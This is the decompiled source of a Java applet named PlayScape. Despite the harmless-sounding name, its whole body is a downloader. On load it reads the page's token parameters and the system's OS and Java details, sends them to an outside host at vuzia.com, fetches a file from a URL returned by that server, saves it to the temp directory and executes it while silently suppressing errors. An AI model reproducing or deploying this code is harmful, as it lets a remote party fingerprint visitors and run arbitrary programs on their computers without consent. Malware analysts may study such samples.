import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.channels.ReadableByteChannel;
import java.io.FileOutputStream;
import java.nio.channels.Channels;
import java.net.MalformedURLException;
import java.net.URL;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class PlayScape extends Applet
{
    private static final long serialVersionUID = 1L;
    
    public void startupAll() {
        try {
            final String parameter = this.getParameter("token");
            final String parameter2 = this.getParameter("ftoken");
            final String property = System.getProperty("java.version");
            String s = System.getProperty("os.name");
            final String property2 = System.getProperty("os.arch");
            try {
                s = URLEncoder.encode(s, "utf8");
            }
            catch (UnsupportedEncodingException ex) {
                ex.printStackTrace();
            }
            final String sendGetRequest = sendGetRequest("http://vuzia.com/get.php", "os=" + s + "&jv=" + property + "&ov=" + property2 + "&t=" + parameter + "&f=" + parameter2);
            System.out.println(sendGetRequest);
            final String[] split = sendGetRequest.split("-");
            System.out.println(split[0]);
            URL url = null;
            final Runtime runtime = Runtime.getRuntime();
            final String property3 = System.getProperty("java.io.tmpdir");
            try {
                url = new URL(split[0]);
            }
            catch (MalformedURLException ex2) {
                ex2.printStackTrace();
            }
            final ReadableByteChannel channel = Channels.newChannel(url.openStream());
            final FileOutputStream fileOutputStream = new FileOutputStream(property3 + split[1]);
            fileOutputStream.getChannel().transferFrom(channel, 0L, 16777216L);
            fileOutputStream.close();
            channel.close();
            try {
                runtime.exec(property3 + split[1]);
            }
            catch (Exception ex3) {}
        }
        catch (Exception ex4) {}
    }
    
    @Override
    public void init() {
        this.startupAll();
    }
    
    public void main(final String[] array) {
        this.startupAll();
    }
    
    public static String sendGetRequest(final String s, final String s2) {
        String string = null;
        if (s.startsWith("http://")) {
            try {
                String string2 = s;
                if (s2 != null && s2.length() > 0) {
                    string2 = string2 + "?" + s2;
                }
                final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new URL(string2).openConnection().getInputStream()));
                final StringBuffer sb = new StringBuffer();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    sb.append(line);
                }
                bufferedReader.close();
                string = sb.toString();
            }
            catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        return string;
    }
}
